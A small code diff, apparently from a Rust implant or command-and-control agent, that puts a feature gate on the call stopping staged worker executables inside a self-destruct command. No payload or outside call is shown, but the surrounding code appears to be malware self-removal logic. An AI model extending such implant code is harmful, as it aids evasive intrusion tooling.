@@ -610,6 +610,7 @@ pub async fn self_destruct() -> crate::types::CommandResult {
     }
 
     // Clear staged worker PE / supervisor state before hard exit.
+    #[cfg(feature = "module-loader")]
     crate::module_supervisor::supervisor().stop_all();
 
     info!("[+] self-destruct scheduled, exiting");
